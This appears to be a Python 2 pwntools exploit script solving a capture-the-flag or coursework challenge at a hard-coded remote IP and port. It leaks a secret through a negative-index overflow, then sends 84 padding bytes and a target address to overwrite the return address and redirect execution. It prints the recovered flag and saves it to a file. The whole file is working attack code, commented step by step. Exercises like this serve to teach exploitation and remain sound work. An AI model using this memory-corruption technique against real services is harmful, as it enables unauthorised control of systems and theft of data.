#!/usr/bin/env python2.7

from pwn import *

# connectionect to the server 140.113.194.66:8787
connection = remote('140.113.194.66', 8787)

''' 
Use buffer overflow to get the secret
'''

# Receive until 'Your choice: ' is encountered and send '1' to view info
connection.recvuntil('Your choice: ', drop = False)
connection.sendline('1')

# Receive until 'Please input id: ' is encountered and send '-1' to let buffer overflow
connection.recvuntil('Please input id: ', drop = False)
connection.sendline('-1')

# Receive until 'Age: ' is encountered and send '1' as choice
connection.recvuntil('Age: ', drop = False)

# Get the content of secret from the feedback
secret = connection.recvline()[ : -1 ]
print secret

''' 
Use buffer overflow to edit the return address
'''

# Receive until 'Your choice: ' is encountered and send '2' to edit info
connection.recvuntil('Your choice: ', drop = False)
connection.sendline('2')

# Receive until 'Please input secret first: ' is encountered and send the secret received before
connection.recvuntil('Please input secret first: ', drop = False)
connection.sendline(secret)

# Receive until 'Please input id: ' is encountered and send '0'
connection.recvuntil('Please input id: ', drop = False)
connection.sendline('0')

# Receive until 'Input new note length: ' is encountered and send '-1' to let buffer overflow
connection.recvuntil('Input new note length: ', drop = False)
connection.sendline('-1')

# Generate a payload to let the return address be wrong
# Make a payload be the interval address from top of sercret.info to ebp
payload = 'b' * 84
# Shift the payload by the address of magic1 and ptint
payload += '\xe0\x89\x04\x08'
# Send the payload back to the server
connection.sendline(payload)

# Receive until 'Your choice: ' is encountered and send '3' to exit
connection.recvuntil('Your choice: ', drop = False)
connection.sendline('3')

# Receive until 'Congrats1!' is encountered and receive a single line
connection.recvuntil('Congrats1!', drop = False)
connection.recvline()

# Print the end of receiving single line 
flag1 = connection.recvline()[ : -1 ]
print flag1

# Write the flag1 into file ../out/flag1.txt
with open('../out/flag1.txt', 'w') as file:
    file.write(flag1)
